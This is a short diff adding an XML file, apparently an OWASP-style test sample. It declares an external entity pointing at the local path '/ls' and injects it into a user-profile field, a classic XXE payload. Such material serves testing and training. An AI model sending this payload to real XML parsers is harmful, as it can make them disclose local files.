@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY bar SYSTEM "/ls">
+
+]>
+
+<owasp>
+<username>Aion</username>
+<email>aion@example.com</email>
+<instagram>&bar;</instagram>
+</owasp>
